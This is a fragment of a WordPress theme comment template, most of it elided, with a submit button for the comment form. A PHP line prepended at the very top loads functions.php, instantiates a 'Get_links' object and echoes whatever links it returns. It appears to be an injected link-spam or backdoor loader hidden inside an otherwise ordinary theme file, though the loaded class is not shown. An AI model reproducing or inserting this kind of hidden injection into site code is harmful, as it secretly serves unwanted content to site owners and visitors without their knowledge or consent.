<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?><?php
global $options;
...
<!-- You can start editing here. -->
	...
	<div id="respond">
		...
		<?php else : ?>
			...
			<p><button name="submit" type="submit" id="submit" tabindex="5"><?php _e('Submit Comment', 'themejunkie') ?></button>
